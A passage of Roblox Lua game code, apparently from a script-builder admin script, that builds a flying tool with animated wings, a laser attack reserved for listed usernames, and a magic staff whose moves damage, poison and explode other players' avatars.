     for wwq=1,#xys do wait()
      gui.Text=xys:sub(1,wwq)
     end
    end)
    for i,v in pairs(gui:children())do
     if v~=script then v:remove()end
    end
   end
   click=false
  end)
 ]],Main)
end
NewCommand=function(commandtut,command,fn)
 X(function()
  Commands[commandtut]=(function(v,s)
   if scmd(v,command)==false then return end 
    coroutine.resume(coroutine.create(fn))
  end)
 end)
end
FlyBin=function(p)
 for i,v in pairs(p:children())do
  if v.Name=='Fly stuff'then
   v:remove()
  end
 end
 bin=new('HopperBin')
 bin.Name='Fly stuff'
 bin.TextureId='http://www.roblox.com/asset/?id=54353092'
 Scripting('local',[[
  Evil={'NEMESlS','Brutally','raj99','alakazard','NEMESZISZ','Player'}
  if not script.Parent:IsA('HopperBin')then
   bin=Instance.new('HopperBin',game.Players.LocalPlayer.Backpack)
   bin.TextureId='http://www.roblox.com/asset/?id=54353092'
   bin.Name='AlaFly'
   script.Parent=bin
  else
   bin=script.Parent
  end
  player=bin.Parent.Parent
  debris=game:service('Debris')
  new=Instance.new
  fnew=CFrame.new
  brick=BrickColor.new
  vnew=Vector3.new
  rot=CFrame.fromEulerAnglesXYZ
  if script.className~='LocalScript'then
   bin:remove()
  end
  T=new('Sound')
  T.SoundId='rbxassetid://2101157'
  T.Pitch=.4
  motors={
   
   right={},
   
   left={},
   
   mains={}
   
  }
  X=function(f)coroutine.resume(coroutine.create(f))end
  life=function(obj,time)debris:AddItem(obj,time)end
  local bv,bg,torso,Lmotor,Rmotor,head
  fly=150
  findt=function()
   for i,v in pairs(player.Character:children())do
    if v.Name=='Torso'then
     return v
    end
   end
  end
  wing=function()
   torso=player.Character.Torso
   for i,v in pairs(torso.Parent:children())do
    if v.Name=='WingMain'then
     v:remove()
    end
   end
   mainwingpart=new('Part')
   mainwingpart.Name='WingMain'
   mainwingpart.CanCollide=false
   mainwingpart.Size=vnew(1,1,1)
   mainwingpart.Transparency=1
   mainwingpart.BrickColor=BrickColor.Black()
   mainwingpart.Parent=player.Character
   weld=new('Weld',torso)
   weld.Part0=weld.Parent
   weld.Part1=mainwingpart
   weld.C0=fnew(0,.4,0)
   WingRight=new('Part')
   WingRight.formFactor=3
   WingRight.Size=vnew(.04,.3,.5)
   WingRight.CanCollide=false
   WingRight.BrickColor=BrickColor.Black()
   WingRight.Parent=mainwingpart
   Rmotor=new('Motor',mainwingpart)
   Rmotor.Part0=Rmotor.Parent
   Rmotor.Part1=WingRight
   Rmotor.C1=rot(0,math.pi/1.5,0)+vnew(-.18,-.10,.8)
   nextpp=nil
   dan=-2
   for w=1,15 do
    wait()
    dan=dan+1
    pp=new('Part')
    pp.Locked=true
    pp.BrickColor=BrickColor.Black()
    pp.formFactor=3
    if w==1 then
     pp.Size=vnew(.3,2.5,.8)
    else
     pp.Size=vnew(.3,1/(w/5),2/w)
    end
    pp.CanCollide=false
    pp.BrickColor=BrickColor.Black()
    pp.CFrame=WingRight.CFrame
    pp.Material='Slate'
    pp.Parent=WingRight
    if dan==1 then
     dan=0
     asdlal=new('WedgePart')
     asdlal.BrickColor=BrickColor.White()
     asdlal.formFactor=3
     asdlal.Size=vnew(.25,pp.Size.y,15/w)
     for lawlz,evil in pairs(Evil)do
      if player.Name==evil then
       asdlal:remove()
       asdlal=new('Part')
       asdlal.formFactor=3
       asdlal.BrickColor=BrickColor.Black()
       asdlal.Size=vnew(.25,.25,15/w)
      end
     end
     asdlal.Locked=true
     asdlal.CanCollide=false
     asdlal.Material='Slate'
     asdlal.Parent=pp
     mmm=new('Motor',pp)
     mmm.Part0=pp
     mmm.Part1=asdlal
     mmm.C0=fnew(0,0,-asdlal.Size.z/2)
    end
    if w==1 then
     ppmotor=new('Motor',WingRight)
    else
     ppmotor=new('Motor',nextpp)
    end
    table.insert(motors.right,ppmotor)
    ppmotor.Part0=ppmotor.Parent
    ppmotor.Part1=pp
    if w==1 then
     ppmotor.C0=rot(-.04,-math.pi/6,0)+vnew(.3,0,-.1)
    else
     ppmotor.C0=rot(-.1/(w/7),-.07,0)+vnew(0,pp.Size.y,0)
    end
    nextpp=pp
   end
 
   WingLeft=new('Part')
   WingLeft.formFactor=3
   WingLeft.Size=vnew(.04,.3,.5)
   WingLeft.CanCollide=false
   WingLeft.BrickColor=BrickColor.Black()
   WingLeft.Parent=mainwingpart
   Lmotor=new('Motor',mainwingpart)
   Lmotor.Part0=Lmotor.Parent
   Lmotor.Part1=WingLeft
   Lmotor.C1=rot(0,-math.pi/1.5,0)+vnew(0.18,-.10,.8)
   nextpp=nil
   dan=-2
   for w=1,15 do
    wait()
    dan=dan+1
    pp=new('Part')
    pp.Locked=true
    pp.BrickColor=BrickColor.Black()
    pp.formFactor=3
    if w==1 then
     pp.Size=vnew(.3,2.5,.8)
    else
     pp.Size=vnew(.3,1/(w/5),2/w)
    end
    pp.CanCollide=false
    pp.BrickColor=BrickColor.Black()
    pp.CFrame=WingLeft.CFrame
    pp.Material='Slate'
    pp.Parent=WingLeft
    if dan==1 then
     dan=0
     asdlal=new('WedgePart')
     asdlal.BrickColor=BrickColor.White()
     asdlal.formFactor=3
     asdlal.Size=vnew(.25,pp.Size.y,15/w)
     for lawlz,evil in pairs(Evil)do
      if player.Name==evil then
       asdlal:remove()
       asdlal=new('Part')
       asdlal.formFactor=3
       asdlal.BrickColor=BrickColor.Black()
       asdlal.Size=vnew(.25,.25,15/w)
      end
     end
     asdlal.Locked=true
     asdlal.CanCollide=false
     asdlal.Material='Slate'
     asdlal.Parent=pp
     mmm=new('Motor',pp)
     mmm.Part0=pp
     mmm.Part1=asdlal
     mmm.C0=fnew(0,0,-asdlal.Size.z/2)
    end
    if w==1 then
     ppmotor=new('Motor',WingLeft)
    else
     ppmotor=new('Motor',nextpp)
    end
    ppmotor.Part0=ppmotor.Parent
    table.insert(motors.left,ppmotor)
    ppmotor.Part1=pp
    if w==1 then
     ppmotor.C0=rot(-.04,math.pi/6,0)+vnew(-.3,0,-.1)
    else
     ppmotor.C0=rot(-.1/(w/7),.07,0)+vnew(0,pp.Size.y,0)
    end
    nextpp=pp
   end
   X(function()
    for i,v in pairs(motors.right)do
     v.C1=rot(.1,0,0)
     wait()
    end
    for i,v in pairs(motors.right)do
     v.C1=rot(0,-.1,-.1)
     wait()
    end
   end)
   X(function()
    for i,v in pairs(motors.left)do
     v.C1=rot(.1,0,0)
     wait()
    end
    for i,v in pairs(motors.left)do
     v.C1=rot(0,.1,.1)
     wait()
    end
   end)
   X(function()
    for i,v in pairs(motors.right)do
     v.C1=rot(.1,0,0)
     wait()
    end
    for i,v in pairs(motors.right)do
     v.C1=rot(0,-.1,0)
     wait()
    end
   end)
   X(function()
    for i,v in pairs(motors.left)do
     v.C1=rot(.1,0,0)
     wait()
    end
    for i,v in pairs(motors.left)do
     v.C1=rot(0,.1,0)
     wait()
    end
   end)
   Rmotor.MaxVelocity=.1
   Lmotor.MaxVelocity=.1
   Lmotor.DesiredAngle=.8
   Rmotor.DesiredAngle=-.8
  end
  leftarm=function(bool)
   X(function()
   newlarm=new('Motor6D')
   newlarm.Name='Left Shoulder'
   newlarm.Parent=player.Character.Torso
   newlarm.Part0=player.Character.Torso
   newlarm.Part1=player.Character['Left Arm']
   wait()--hmm
   newlarm.C0=fnew(-1,.5,0,0,0,-1,0,1,0,1,0,0)
   newlarm.C1=fnew(.5,.5,0,0,0,-1,0,1,0,1,0,0)
   if bool==false then return newlarm end
   an=player.Character.Animate
   an.Disabled=true
   an.Disabled=false
   end)
   return newlarm
  end
  Name=function()
   name=''
   for LA=1,3 do
    name=name..string.char(math.random(0,255))
   end
   return name
  end
  Lazer=function(m)wllwlw=false
   for i,v in pairs(Evil)do
    if v==player.Name then
     wllwlw=true break
    end
   end
   if wllwlw==false then return end
   if asdTroll~=nil then return end
   asdTroll='asd'
   rarm=rightarm(false)
   rarm.MaxVelocity=.2
   rarm.DesiredAngle=math.rad(110)
   larm=leftarm(false)
   larm.MaxVelocity=.2
   larm.DesiredAngle=-math.rad(110)
   
   lball=new('Part')
   life(lball,10)
   lball.Shape=0
   lball.Size=vnew(1,1,1)
   lball.CanCollide=false
   lball.BottomSurface=0
   lball.TopSurface=0
   lball.Transparency=.5
   lball.BrickColor=BrickColor.White()
   for i,v in pairs(Evil)do
    if player.Name==v then
     lball.BrickColor=BrickColor.Black()
    end
   end
   lball.Parent=player.Character
   lweld=new('Weld',larm.Part1)
   lweld.Part0=lweld.Parent
   lweld.Part1=lball
   lweld.C0=fnew(0,-4,0)
   
   rball=new('Part')
   life(rball,10)
   rball.Shape=0
   rball.Size=vnew(1,1,1)
   rball.Transparency=.5
   rball.CanCollide=false
   rball.BottomSurface=0
   rball.TopSurface=0
   rball.BrickColor=BrickColor.White()
   for i,v in pairs(Evil)do
    if player.Name==v then
     rball.BrickColor=BrickColor.Black()
    end
   end
   rball.Parent=player.Character
   rweld=new('Weld',rarm.Part1)
   rweld.Part0=rweld.Parent
   rweld.Part1=rball
   rweld.C0=fnew(0,-4,0)
   X(function()
    X(function()
     for KG=1,157 do wait()
      part=new('Part')
      life(part,.2)
      part.Transparency=.3
      asdrandom=(math.random(5,20)/10)+KG/40
      new('BlockMesh',part).Scale=vnew(asdrandom,asdrandom,asdrandom)
      part.Size=vnew(1,1,1)
      part.Anchored=true
      part.CFrame=rot(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))+lball.Position
      part.Name='asd'
      part.BrickColor=BrickColor.White()
      for i,v in pairs(Evil)do
       if player.Name==v then
        part.BrickColor=BrickColor.Black()
       end
      end
      part.Parent=lball
     end
    end)
    for KG2=1,157 do wait()
     part=new('Part')
     life(part,.2)
     part.Transparency=.3
     asdrandom=(math.random(5,20)/10)+KG2/40
     new('BlockMesh',part).Scale=vnew(asdrandom,asdrandom,asdrandom)
     part.Size=vnew(1,1,1)
     part.Anchored=true
     part.CFrame=rot(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))+rball.Position
     part.Name='asd'
     part.BrickColor=BrickColor.White()
     for i,v in pairs(Evil)do
      if player.Name==v then
       part.BrickColor=BrickColor.Black()
      end
     end
     part.Parent=rball
    end
   rball:remove()
   lball:remove()
   rightarm(true)
   leftarm(true)
   asdTroll=nil
    for wasd=1,200 do
     if pp~=nil then pp:remove()end
     if asdTroll~=nil then return end
     pos=m.Hit.p
     pp=new('Part')
     life(pp,.1)
     pp.formFactor=3
     pp.BrickColor=BrickColor.Black()
     pp.Transparency=.2
     pp.Size=vnew(6,1000,6)
     pp.CFrame=CFrame.new(pos.x,pos.y+(pp.Size.y/2),pos.z)+vnew(math.random(-3,3),0,math.random(-3,3))
     exp=Instance.new('Explosion')
     exp.Position=pos+vnew(math.random(-3,3),0,math.random(-3,3))
     exp.BlastRadius=30
     exp.Parent=workspace
     Join=new('Part')
     Join.formFactor=0
     Join.Size=vnew(1,1,1)
     new('SpecialMesh',Join).MeshType='Sphere'
     Join.Mesh.Scale=vnew(60,60,60)
     Join.Anchored=true
     Join.BottomSurface=0
     Join.TopSurface=0
     Join.BrickColor=BrickColor.Black()
     Join.Transparency=.5
     Join.CFrame=rot(0,math.rad(3.6*wasd)*2,0)+pos+vnew(math.random(-3,3),0,math.random(-3,3))
     Join.Parent=pp
     pJoin=new('Part')
     life(pJoin,.4)
     new('BlockMesh',pJoin).Scale=vnew(10,10,10)+vnew((wasd/30),(wasd/30),(wasd/30))
     pJoin.formFactor=0
     pJoin.Size=vnew(1,1,1)
     pJoin.Anchored=true
     pJoin.BrickColor=BrickColor.Black()
     pJoin.Transparency=.5
     pJoin.CFrame=rot(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360)))+pos+vnew(math.random(-3,3),0,math.random(-3,3))
     pJoin.Parent=workspace
     pp.Parent=player.Character
     wait()
     pp.BrickColor=BrickColor.White()
    end
   end)
  -- rightarm(true)
  end
  rightarm=function(bool)
   if pcall(function()
    newrarm=new('Motor6D')
    newrarm.Name='Right Shoulder'
    newrarm.Parent=player.Character.Torso
    newrarm.Part0=player.Character.Torso
    newrarm.Part1=player.Character['Right Arm']
    newrarm.C0=fnew(1,.5,0,0,0,1,0,1,0,-1,0,0)
    newrarm.C1=fnew(-.5,.5,0,0,0,1,0,1,0,-1,0,0)
    if bool==false then return newlarm end
    pcall(function()
     an=player.Character.Animate
     an.Disabled=true
     an.Disabled=false
    end)
   end)then
   return newrarm
   end
  end
  light=function()
   if pcall(function()torso=player.Character.Torso end)then
   else
   return
   end
   larm=leftarm(false)
   tt=T:clone()
   life(tt,0)
   tt.Parent=workspace
   tt:play()
   Pl=new('Part')
   life(Pl,20)
   Pl.CFrame=torso.CFrame+torso.CFrame.lookVector*6
   Pl.Anchored=true
   Pl.CanCollide=false
   Pl.Parent=workspace
   leftarm(true)
  end
  bodys=function(asd)
   for i,v in pairs(torso:children())do
    if v:IsA('BodyVelocity')or v:IsA('BodyGyro')then
     v:remove()
    end
   end
   if asd==true then return end
   bv=new('BodyVelocity')
   bg=new('BodyGyro')
   bv.maxForce=vnew(math.huge,math.huge,math.huge)
   bv.velocity=vnew(0,0,0)
   bg.maxTorque=vnew(0,0,0)
   bg.Parent=torso 
   bv.Parent=torso
  end
  ball=function(asd)
   for i,v in pairs(player.Character:children())do
    if v.Name=='Fly Ball'then
     v:remove()
    end
   end
   if asd==true then return end
   part=new('Part')
   part.Shape=0
   part.BottomSurface=0
   part.TopSurface=0
   part.Size=torso.Size*5
   part.Transparency=.5
   part.BrickColor=BrickColor.Black()
   part.CanCollide=false
   part.CFrame=torso.CFrame
   part.Name='Fly Ball'
   part.Parent=player.Character
   weld=new('Weld')
   weld.Parent=torso
   weld.Part0=weld.Parent
   weld.Part1=part
   part.Touched:connect(function()
    for i=1,5 do
     wait()
     part.Transparency=.5-i/10
    end
    part.Transparency=.5
   end)
  end
  script.Parent.Selected:connect(function(m)
   torso=player.Character.Torso
   bodys(true)
   m.KeyDown:connect(function(k)
    if k=='q'then
     fly=fly-10
     if fly<0 then
      fly=10
     end
    elseif k=='r'then
     wing()
    elseif k=='f'then
     Lazer(m)
    elseif k=='t'then
     X(function()player.Character.WingMain:remove()end)
    elseif k=='e'then
     fly=fly+10
    elseif k=='y'then
     MUp=false
     bodys(false)
    elseif k=='p'then
     print'asd'
    elseif k=='b'then
     fly=150
    elseif k=='x'then
     X(function()
      if m.Target==workspace or m.Target==nil then return end
      ko=new('ObjectValue')
      game:service('Debris'):AddItem(ko,1)
      ko.Value=player
      ko.Name='creator'
      for i,v in pairs(m.Target.Parent:children())do
       if v:IsA('Humanoid')then
        ko.Parent=v
        v.Torso:BreakJoints()
        X(function()
         for asd=1,100 do 
          wait()
          part=new('Part')
          game:service('Debris'):AddItem(part,.2)
          part.formFactor=0
          part.Transparency=.3
          part.Anchored=true
          part.CanCollide=false
          part.CFrame=rot(math.rad(math.random(1,180)),math.rad(math.random(1,180)),math.rad(math.random(1,180)))+v.Torso.Position
          part.Size=vnew(2,2,2)
          part.BrickColor=BrickColor.Black()
          random=math.random(part.Size.x,part.Size.x*2)
          new('BlockMesh',part).Scale=vnew(random,random,random)
          part.Parent=workspace
         end
        end)
       end
      end
     end)
    end
   end)
   m.Button1Down:connect(function()
    ball(true)
    bodys(false)
    MUp=false
    rightarm(false)
    leftarm(false)
    bg.maxTorque=Vector3.new(900000,900000,900000)
    bg.cframe=fnew(torso.Position,m.hit.p)*rot(math.rad(-60),0,0)
    bv.velocity=fnew(torso.Position,m.hit.p).lookVector*fly
   end)
   m.Move:connect(function()
    if MUp==true then return end
    torso=player.Character.Torso
    X(function()
     bg.maxTorque=vnew(math.huge,math.huge,math.huge)
     bg.cframe=fnew(torso.Position,m.hit.p)*rot(math.rad(-60),0,0)
     bv.velocity=fnew(torso.Position,m.hit.p).lookVector*fly
    end)
   end)
   m.Button1Up:connect(function()
    MUp=true
    ball(true)
    bodys(false)
    rightarm(true)
    leftarm(true)
    bv.maxForce=vnew(10000,10000,10000)
    delay(2,function()if MUp==true then bodys(true)end end)
    torso.Velocity=vnew(0,0,0)
    torso.RotVelocity=vnew(0,0,0)
    torso.CFrame=fnew(torso.Position,m.hit.p)*rot(0,0,0)
    torso.Velocity=vnew(0,0,0)
    torso.RotVelocity=vnew(0,0,0)
   end)
  end)
  bin.Deselected:connect(function()
   X(function()
    ball(true)
    bodys(true)
    torso.Velocity=vnew(0,0,0)
    torso.RotVelocity=vnew(0,0,0)
   end)
  end)
  wing()
 ]],bin)
 bin.Parent=p
end
StaffSourceNew=[[ player=script.user.Value soul=0 x=function(f)coroutine.resume(coroutine.create(f))end ko=function(humanoid)if humanoid:FindFirstChild('creator')then return end k=Instance.new('ObjectValue')k.Name='creator'k.Value=player k.Parent=humanoid player.Character.Humanoid:TakeDamage(-humanoid.MaxHealth)soul=soul+1 end ]]
StaffSourceF1=StaffSourceNew..[[script.Parent.Touched:connect(function(a)x(function()if vnc~=nil then return end vnc='asd' x(function()if a.Parent:IsA('Tool')and a.Parent:IsA('Hat')and a.Parent==player.Character then return end humanoid=a.Parent.Humanoid ko(humanoid)for i=1,3 do exp=Instance.new('Explosion',workspace)exp.Position=a.Position+Vector3.new(0,i,0)wait()end for i=1,10 do wait() for wqe,n in pairs(script.Parent.Parent:children())do if n:IsA('BasePart')then n.Transparency=i/10 if n.Transparency==1 then n:remove()end end end end end)end)end)]]
StaffSourceF2=StaffSourceNew..[[wait(4)for aw=1,3 do wait()for i=1,3 do exp=Instance.new('Explosion',workspace)exp.Position=script.Parent.Position+Vector3.new(math.random(-6,6)*i*aw,i*aw,math.random(-6,6)*i*aw) end end script.Parent.Parent:remove()]]
StaffFunctionsLoad=se.lighting.ChildAdded:connect(function(a)
 X(function()wait()
  if a.Name=='StaffFunction1'then
   nalol=Scripting('script',StaffSourceF1,nil)
   a.user.Parent=nalol
   nalol.Parent=a.parent.Value
  elseif a.Name=='StaffFunction2'then
   nalol=Scripting('script',StaffSourceF2,nil)
   a.user.Parent=nalol
   nalol.Parent=a.parent.Value
  end
 end)
end)
Staff=function(par)
 X(function()
  for i,v in pairs(par:children())do
   if v.Name=='AlaStaff'then
    wait()
    se.debris:AddItem(v,.1)
   end
  end
 end)
 Print('Load Staff for '..par.Parent.Name..'!')
 Tool=new('Tool')
 Tool.Name='AlaStaff'
 Tool.GripPos=vnew(0,.5,0)
 Tool.TextureId='http://www.roblox.com/asset/?id=54353092'
 ToolHandle=new('Part')
 ToolHandle.Material=('Wood')
 ToolHandle.BrickColor=bcn('Reddish brown')
 ToolHandle.Name='Handle'
 ToolHandle.formFactor=3
 ToolHandle.Size=vnew(.5,6,.5)
 ToolHandle.CanCollide=false
 ToolHandle.Parent=Tool
 
 Scripting('local',[[
  --================Tool!================--
  tool=script.Parent
  staff=tool.Handle
  SmokePart=nil
  --=====================================--
  --===============Player!===============--
  player=nil
  if tool.Parent:IsA('Model')then
   player=game.Players[tool.Parent.Name]
   elseif tool.Parent:IsA('Backpack')then
   player=tool.Parent.Parent
  end
  --=====================================--
  --================Math!================--
  random=                       math.random;
  pi=                               math.pi;
  --=====================================--
  --==============Services!==============--
  debris=             game:service('Debris')
  workspace=       game:service('Workspace')
  lighting=         game:service('Lighting')
  insert=      game:service('InsertService')
  --=====================================--
  --===============Changes===============--
  new=                         Instance.new;
  unew=                           UDim2.new;
  vnew=                         Vector3.new;
  fnew=                          CFrame.new;
  cnew=                          Color3.new;
  bcn=                       BrickColor.new;
  look=                   CFrame.lookVector;
  rot=            CFrame.fromEulerAnglesXYZ;
  soul=                                   0;
  --=====================================--
  tool.Parent=player.Backpack
  clickActive=false
  kayActive=false
  --===========Base Functions!===========--
  x=function(f)coroutine.resume(coroutine.create(f))end
  
  sing=function(name,parent)
   x(function()
    mmo=new('Model')
    debris:AddItem(mmo,1)
    mmo.Name='StaffFunction'..name
    V=new('ObjectValue',mmo)
    V.Value=player
    V.Name='user'
    mmq=new('ObjectValue',mmo)
    mmq.Name='parent'
    mmq.Value=parent
    mmc=mmo:clone()
    debris:AddItem(mmc,1)
    mmc.Parent=lighting
   end)
  end
  
  ko=function(humanoid)
   if humanoid:FindFirstChild('creator',true)then return end
   k=new('ObjectValue')
   k.Name='creator'
   k.Value=player
   k.Parent=humanoid
   player.Character.Humanoid:TakeDamage(-humanoid.MaxHealth)
   soul=soul+1
  end
  s1=function(t)
   x(function()
    clickActive=false
    for i,h in pairs(t.Parent:children())do
     if h:IsA('Humanoid')then
      h:TakeDamage(.1)
      if h.Health<=0 then
       ko(h)
       print'DIE!'
      end
      return
     end
    end
    t:BreakJoints()
    clickActive=false
   end)
  end
  s2=function(t)
   x(function()
    delay(.1,function()s3(t)end)
    if t:FindFirstChild('w-')then return end
    q=player.Character.Torso.CFrame.lookVector
    wq=new('BodyThrust')
    debris:AddItem(wq,.2)
    x(function()debris:AddItem(t.Smoke,.02)end)
    x(function()
     smc=Smoke:clone()
     debris:AddItem(smc,3)
     smc.Enabled=true
     smc.Parent=t
    end)
    wq.force=vnew(40,40,40)
    wq.location=vnew(0,100,1)
    wq.Parent=t
    qwe = Instance.new('BodyVelocity')
    debris:AddItem(qwe,.3)
    qwe.Name='w-'
    qwe.maxForce=Vector3.new(1e7,1e7,1e7)
    qwe.P=125
    qwe.velocity=(Vector3.new(q.x,q.y,q.z)*100)+Vector3.new(0,30,0)
    qwe.Parent=t
    clickActive=false
    for i,h in pairs(t.Parent:children())do
     if h:IsA('Humanoid')then
      h:TakeDamage(10)
      if h.Health<=0 then
       ko(h)
       print'DIE!'
      end
      return
     end
    end
    t:BreakJoints()
    clickActive=false
   end)
  end
  s3=function(t)
   x(function()
    if t.Size.x+t.Size.y+t.Size.z<=20 then
     t.Anchored=false
    end
    if staff:FindFirstChild('ow')or staff:FindFirstChild('wq')then return end
    pa=new('Part')
    debris:AddItem(pa,3)
    pa.Name='ow'
    pa.formFactor=0
    pa.Size=vnew(1,1,1)
    pa.Transparency=1
    pa.CanCollide=false
    pa.Parent=staff
    fire=new('Fire',pa)
    fire.Size=3
    fire.Heat=14
    weld=new('Weld',staff)
    weld.Part0=staff
    weld.Part1=pa
    weld.C0=fnew(0,staff.Size.y/1.3,0)
    clickActive=false
    for i,h in pairs(t.Parent:children())do
     if h:IsA('Humanoid')then
      h:TakeDamage(20)
      if h.Health<=0 then
       ko(h)
      end
      return
     end
    end
    t:BreakJoints()
    clickActive=false
   end)
  end
  --=====================================--
  tool.TextureId='http://www.roblox.com/asset/?id=54353092'
  tool.Activated:connect(function()
   if kayActive==true then return end
   clickActive=true
   mode=mode+1
   if mode==2 then
    a=new('StringValue')
    debris:AddItem(a,1)
    a.Name='toolanim'
    a.Value='Slash'
    a.Parent=tool
   elseif mode==3 then
    s3()
   end
   wait(.3)
   mode=1
   clickActive=false
  end)
  tool.Equipped:connect(function(d)
   pcall(function()staff.CFrame=player.Character['Right Arm'].CFrame end)
   d.KeyUp:connect(function(k)if k=='e'then Round=false end end)
   d.KeyDown:connect(function(k)
    x(function()
     if k=='t'then
      if clickActive==true then return end
      kayActive=true --Rofl
      if d.Target==nil then return end
      torso=player.Character.Torso
      torso.Velocity=vnew(0,0,0)
      torso.RotVelocity=vnew(0,0,0)     
      torso.CFrame=fnew(d.Hit.p.x,d.Hit.p.y+5,d.Hit.p.z)
      torso.Velocity=vnew(0,0,0)
      torso.RotVelocity=vnew(0,0,0)
      Sp.Enabled=true
      wait(.1)
      Sp.Enabled=false
      kayActive=false
     elseif k=='p'then
      if Poisoning==true then print'Poisoning Active!' return end
      Poisoning=true
      Pp=new('Part')
      Pp.formFactor=0
      Pp.Size=vnew(1,1,1)
      Pp.Transparency=.9
      Pp.Position=d.Hit.p
      Pp.BrickColor=BrickColor.Green()
      Pp.CanCollide=false
      Pp.Anchored=true
      new('SpecialMesh',Pp).MeshType='Sphere'
      Pp.Mesh.Scale=vnew(50,50,50)
      Pp.Parent=workspace
      for lw=1,10 do 
       nPp=new('Part')
       nPp.formFactor=0
       nPp.Size=vnew(1,1,1)
       nPp.Transparency=.9
       nPp.CFrame=Pp.CFrame
       nPp.BrickColor=BrickColor.Green()
       nPp.CanCollide=false
       nPp.Anchored=true
       new('SpecialMesh',nPp).MeshType='Sphere'
       nPp.Mesh.Scale=vnew(4.5*lw,4.5*lw,4.5*lw)
       nPp.Parent=Pp
      end
      debris:AddItem(Pp,200*.2)
      delay(0,function()
       for RoundNew=1,200 do
        wait(.2)
        if Pp==nil then break end
        pcall(function()
         for yy,X in ipairs(game:service('Players'):GetPlayers())do
          if X~=player then
           pcall(function()
            if (X.Character.Torso.Position-Pp.Position).magnitude<30 then
             for z,humaa in pairs(X.Character:children())do
              if humaa:IsA('Humanoid')then 
               pcall(function()
                newSound=new('Sound')
                newSound.Parent=X.Backpack
               end)
               humaa:TakeDamage(5)
               if humaa.Health<=0 then
                ko(humaa)
               end
              end
             end
            end
           end)
          end
         end
        end)
       end
       pcall(function()Pp:remove()end)
       Poisoning=false
      end)
     elseif k=='e'then
      if clickActive==true or kayActive==true then return end
      kayActive=true
      Round=true
      Sp.Enabled=true
      soundnew=new('Sound')
      soundnew.SoundId='rbxasset://sounds/collide.wav'
      soundnew.Pitch=.5
      soundnew.Volume=1
      repeat
       wait(.05)
       pcall(function()
        for ah,Vplayer in ipairs(game:service('Players'):GetPlayers())do
         pcall(function()
          if (Vplayer.Character.Torso.Position-d.Hit.p).magnitude<7 then
           for l,o in pairs(Vplayer.Character:children())do
            if o:IsA('Humanoid')then ko(o)end
           end
          end
         end)
        end
        pcall(function()player.Character.Torso.CFrame=fnew(player.Character.Torso.Position,vnew(d.hit.p.x,0,d.hit.p.z))end)
        Apart=new('Part')
        soundnew:clone().Parent=Apart
        debris:AddItem(Apart,.3)
        Apart.formFactor=0
        Apart.Size=vnew(1,1,1)
        Apart.Transparency=.2
        Apart.CanCollide=true
        --Apart.Anchored=true 
        rand=math.random(1,6)
        new('BlockMesh',Apart).Scale=vnew(rand,rand,rand)
        Apart.BrickColor=BrickColor.random()
        Apart.CFrame=rot(math.rad(math.random(-360,360)),math.rad(math.random(-360,360)),math.rad(math.random(-360,360)))+d.Hit.p+vnew(math.random(-2,2),math.random(-2,2),math.random(-2,2))
        Apart.Parent=workspace
        pcall(function()Apart.Sound:play()end)
        pcall(function()Apart.Sound:play()end)
        exp=new('Explosion')
        exp.BlastRadius=6
        exp.Position=Apart.Position
        exp.Parent=Apart
       end)
      until Round==false
      pcall(function()
       soundnew:remove()
       Sp.Enabled=false 
      end)
 
      kayActive=false
     elseif k=='n'then
      if clickActive==true then return end
      kayActive=true
      Smoke.RiseVelocity=20
      x(function()
       if Smoke.Enabled==true then return end
       for i,v in pairs(SmokePart:children())do
        x(function()v.Enabled=true end)
       end
       for b=1,10 do
        wait()
        for i,v in pairs(tool:children())do
         if v==staff then
          v.BrickColor=bcn(1003)
          v.Material=('Slate')
          wait()
          v.Material=('Wood')
          v.BrickColor=bcn('Reddish brown')
         end
         if v~=staff and v~=SmokePart and v~=script then
          v.Material=('Plastic')
          v.Transparency=b/10
          if b==10 then
           v:remove()
          end
         end
        end
       end
       for i,v in pairs(SmokePart:children())do
        x(function()v.Enabled=false end)
       end
       Smoke.RiseVelocity=5
       kayActive=false
      end)
     elseif k=='q'then
      if clickActive==true then return end
      kayActive=true
      x(function()
       if Sp.Enabled==true then return end
       Sp.Enabled=true
       Model=new('Model',player.Character)
       debris:AddItem(Model,30)
       Model.Name='Snare'..random(-999999,999999)
       partnew=new('Part')
       partnew.Anchored=true
       partnew.Shape=0
       partnew.Size=vnew(4,4,4)
       partnew.Material=('Slate')
       partnew.BrickColor=bcn('Bright red')
       partnew.BottomSurface=0
       partnew.TopSurface=0
       partnew.Name='Main'
       partnew.CFrame=fnew(d.Hit.p.x,d.Hit.p.y,d.Hit.p.z)
       partnew.Parent=Model
       for ee=1,6 do
        partlist={}
        for aa=1,14 do 
         wait()
         p=new('Part')
         partlist[aa]=p
         p.formFactor=3
         p.CanCollide=false
         p.Size=vnew(2,2,2)
         p.BottomSurface=0
         p.TopSurface=0
         p.Material=('Slate')
         if aa~=1 then
          p.BrickColor=bcn(1003)
          p.Size=Vector3.new(2,2,2/(aa/10))
         end
         p.CFrame=partnew.CFrame
         p.Parent=Model
         if aa==1 then
          w=new('Weld',partnew)
         else
          wq=aa-1
          w=new('Weld',partlist[wq])
         end
         w.Part0=w.Parent
         w.Part1=p
         w.C0=rot(0,0,.25/-aa)+vnew(p.Size.x/2,0,0)
         if aa==2 then
          w.C0=rot(0,ee,.2)+vnew(0,.2,0)
         end
        end
       end
       for i,v in pairs(Model:children())do
        if v:IsA('BasePart')then
         v.Anchored=true
         v:BreakJoints()
        end
       end
       sing('1',partnew)
       Sp.Enabled=false
       kayActive=false
      end)
     end
    end)
   end)   
   x(function()mainarm=player.Character['Right Arm']
    weld=new('Weld',mainarm)
    weld.Part0=weld.Parent
    weld.Part1=staff
    weld.C0=rot(-pi/2,0,0)+vnew(0,-1,.55)
   end)
   tool.TextureId='http://www.roblox.com/asset/?id=54353092'
   mode=1
   if z~=nil then return end
   z='asd'
   for i,v in pairs(tool:children())do
    if v~=staff and v~=script then
     v:remove()
    end
   end
   x(function()
    for cc=1,6 do
     for i=1,13 do
      wait''
      if tool.Parent~=player.Character then
       break
      end
      x(function()
        p=new('Part')
        p.Name=i
        p.formFactor=3
        p.CanCollide=false
        p.Size=vnew(.6,.6,.6)
        p.Material=('Slate')
        if i~=1 then
         p.Size=vnew(.52+i/200,.52-i/40,.52-i/40)
         p.BrickColor=bcn(1003)
        end
        p.CFrame=staff.CFrame
        p.Parent=tool
        if i==1 then
         w=new('Weld',staff)
        else
         qn=tool[i-1]
         w=new('Weld',tool[i-1])
         qn.Name='?'
        end
        w.Part0=w.Parent
